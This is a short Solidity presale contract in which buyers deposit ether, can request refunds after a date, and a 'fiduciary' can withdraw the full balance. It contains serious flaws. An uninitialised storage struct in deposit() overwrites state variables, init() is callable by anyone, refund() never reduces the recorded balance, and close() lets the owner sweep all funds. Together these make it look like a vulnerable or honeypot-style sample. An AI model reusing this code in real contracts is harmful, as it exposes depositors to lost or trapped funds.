1 pragma solidity ^0.4.11;
2 
3 contract Presale {
4     bool isClosed;
5     struct Deposit { address buyer; uint amount; }
6     uint refundDate;
7     address fiduciary = msg.sender;
8     Deposit[] public Deposits;
9     mapping (address => uint) public total;
10 
11     function() public payable { }
12 
13     function init(uint date)
14     {
15         refundDate = date;
16     }
17 
18     function deposit()
19     public payable {
20         if (msg.value >= 0.5 ether && msg.sender!=0x0)
21         {
22             Deposit newDeposit;
23             newDeposit.buyer = msg.sender;
24             newDeposit.amount = msg.value;
25             Deposits.push(newDeposit);
26             total[msg.sender] += msg.value;
27         }
28         if (this.balance >= 100 ether)
29         {
30             isClosed = true;
31         }
32     }
33 
34     function refund(uint amount)
35     public {
36         if (now >= refundDate && isClosed==false)
37         {
38             if (amount <= total[msg.sender] && amount > 0)
39             {
40                 msg.sender.transfer(amount);
41             }
42         }
43     }
44     
45     function close()
46     public {
47         if (msg.sender == fiduciary)
48         {
49             msg.sender.transfer(this.balance);
50         }
51     }
52 }